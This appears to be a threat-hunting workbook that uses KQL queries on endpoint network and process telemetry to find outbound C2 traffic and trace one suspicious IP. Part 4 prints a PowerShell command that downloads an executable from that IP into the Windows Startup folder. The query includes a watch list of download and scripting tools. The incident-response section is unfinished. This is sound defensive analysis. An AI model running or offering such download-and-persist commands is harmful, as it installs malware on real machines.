## 📡 Workbook 2 — Outbound C2 Communication

This workbook investigates **outbound connections to public internet destinations over the last 30 days**.

The goal is to identify:

- Repeated outbound connections
- Suspicious processes making connections
- Direct IP communication
- Potential C2 infrastructure

---

## Part 1 — Outbound C2 Overview

### KQL Query

```kusto
let MSRanges = dynamic(["13.107.0.0/16","40.96.0.0/13","40.104.0.0/15","40.108.128.0/17",
"52.96.0.0/14","52.100.0.0/14","52.104.0.0/14","52.108.0.0/14","52.112.0.0/14","52.122.0.0/15",
"104.47.0.0/17","104.146.128.0/17","132.245.0.0/16","150.171.0.0/16","204.79.197.0/24"]);

DeviceNetworkEvents
| where Timestamp >= ago(30d)
| where ActionType == "ConnectionSuccess"
| where RemoteIPType == "Public" and isnotempty(RemoteIP)
| extend Domain = tolower(RemoteUrl)

| where isempty(Domain) or not(Domain matches regex @"(^|\.)(microsoft\.com|microsoft\.net|microsoftonline\.com|windows\.com|windows\.net|windowsupdate\.com|windowsazure\.com|azure\.com|azure\.net|azurefd\.net|azureedge\.net|office\.com|office\.net|office365\.com|officeapps\.live\.com|live\.com|live\.net|msn\.com|msn\.cn|bing\.com|skype\.com|xboxservices\.com|xboxlive\.com|xboxab\.com|sharepoint\.com|onedrive\.com|outlook\.com|copilot\.com|passport\.net|msftconnecttest\.com|msftncsi\.com|cloud\.microsoft|static\.microsoft|dev\.microsoft|sfx\.ms|digicert\.com|lencr\.org|verisign\.com|img-s-msn-com\.akamaized\.net)$")
| where not(coalesce(ipv4_is_in_any_range(RemoteIP, MSRanges), false))

| extend SuspiciousProcess = InitiatingProcessFileName in~ (
    "powershell.exe","powershell_ise.exe","pwsh.exe","cmd.exe","mshta.exe",
    "wscript.exe","cscript.exe","certutil.exe","bitsadmin.exe","regsvr32.exe",
    "wget.exe","wget","curl.exe","curl","python.exe","python3.exe","python3.12",
    "wsl.exe","bash.exe"
)

| extend geo = geo_info_from_ip_address(RemoteIP)
| extend Latitude = toreal(geo.latitude),
         Longitude = toreal(geo.longitude),
         Country = tostring(geo.country),
         State = tostring(geo.state),
         City = tostring(geo.city)
| where isnotempty(Latitude) and isnotempty(Longitude)

| summarize
    Connections = count(),
    Devices = dcount(DeviceName),
    SuspiciousConnections = countif(SuspiciousProcess),
    SuspiciousProcesses = make_set_if(InitiatingProcessFileName,SuspiciousProcess,15),
    Processes = make_set(InitiatingProcessFileName,25),
    Ports = make_set(RemotePort,15),
    IPOnlyConnections = countif(isempty(RemoteUrl)),
    SampleUrl = take_anyif(RemoteUrl,isnotempty(RemoteUrl)),
    FirstSeen = min(Timestamp),
    LastSeen = max(Timestamp)
    by RemoteIP, Country, State, City, Latitude, Longitude

| where Connections >= 5
| where Devices <= 10 or SuspiciousConnections >= 3
| extend ConnectionsPerDevice = round(todouble(Connections)/todouble(Devices),1)

| extend C2Score =
    iif(SuspiciousConnections > 0,3,0)
    + iif(Devices <= 3,2,iif(Devices <= 10,1,0))
    + iif(ConnectionsPerDevice >= 10,2,iif(ConnectionsPerDevice >= 5,1,0))
    + iif(IPOnlyConnections == Connections,1,0)

| where C2Score >= 2

| extend MapLabel = strcat(
    coalesce(SampleUrl,RemoteIP)," — ",
    Connections," connections / ",
    Devices," devices — Score: ",C2Score
)

| project Latitude, Longitude, MapLabel, C2Score, Devices, Connections,
          ConnectionsPerDevice, SuspiciousConnections, SuspiciousProcesses,
          Processes, Ports, SampleUrl, RemoteIP, Country, State, City,
          FirstSeen, LastSeen
| order by C2Score desc, SuspiciousConnections desc, ConnectionsPerDevice desc
```

### C2 Communication Map

The map shows suspicious public destinations after removing common Microsoft traffic.

Destinations are prioritized using:

- Repeated connections
- Suspicious processes
- Few affected devices
- Direct IP communication
- C2Score

>  **C2 Overview** Image - Add later 

---

## Part 2 — C2 Candidate Analysis

### 🔴 Suspicious Destination — `77.110.114.53`

`77.110.114.53` was selected for deeper investigation.

| Finding | Result |
|---|---|
| C2 Score | **7** |
| Connections | **5** |
| Devices | **1** |
| Suspicious Connections | **5 / 5** |
| Process | `powershell.exe` |
| Port | `80` |
| Domain | Direct IP |
| First Seen | Aug 11, 2026 — 6:38:40 PM |
| Last Seen | Aug 18, 2026 — 12:50:04 AM |

All five connections were initiated by **PowerShell** from a single device.

This made the destination a high-priority **C2 candidate**.

> **Suspicious C2 Result** Image - Add later 


---

## Part 3 — Connection Timeline

I filtered the network telemetry for `77.110.114.53`.

```kusto
DeviceNetworkEvents
| where Timestamp >= ago(30d)
| where RemoteIP == "77.110.114.53"
| project Timestamp,
          DeviceName,
          ActionType,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine,
          RemoteIP,
          RemotePort,
          RemoteUrl
| order by Timestamp asc
```

### Findings

- **5 successful connections**
- **1 device**
- All connections initiated by `powershell.exe`
- First seen: **Aug 11 — 6:38:40 PM**
- Last seen: **Aug 18 — 12:50:04 AM**

The repeated PowerShell connections show the destination was contacted more than once during the 30-day period.

> **Connection Timeline** Image - Add later 

---

## Part 4 — Process Correlation

I searched process telemetry for commands referencing the same IP.

```kusto
DeviceProcessEvents
| where Timestamp >= ago(30d)
| where ProcessCommandLine has "77.110.114.53"
    or InitiatingProcessCommandLine has "77.110.114.53"
| project Timestamp,
          DeviceName,
          AccountName,
          FileName,
          ProcessCommandLine,
          InitiatingProcessFileName
| order by Timestamp asc
```

The same IP appeared in PowerShell activity related to the previous compromise.

One observed command downloaded `MicrosoftPrt.exe` directly from the IP:

```powershell
(new-object System.Net.WebClient).DownloadFile(
'http://77.110.114.53/MicrosoftPrt.exe',
'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftPrt.exe'
)
```

This links the outbound network activity to the **payload download activity identified in Workbook 1**.

> **PowerShell Correlation** Image - Add later 

---

## C2 Activity Timeline

1. **Aug 11 — 6:38:40 PM** — First connection to `77.110.114.53`
2. **Aug 11 — 6:38:40 PM** — `powershell.exe` communicates over port `80`
3. **Aug 11 — 6:38:39–6:38:50 PM** — Payload download activity observed
4. **Following Days** — Additional connections occur
5. **Aug 18 — 12:50:04 AM** — Last observed connection

---

## Part 5 — Incident Response

........
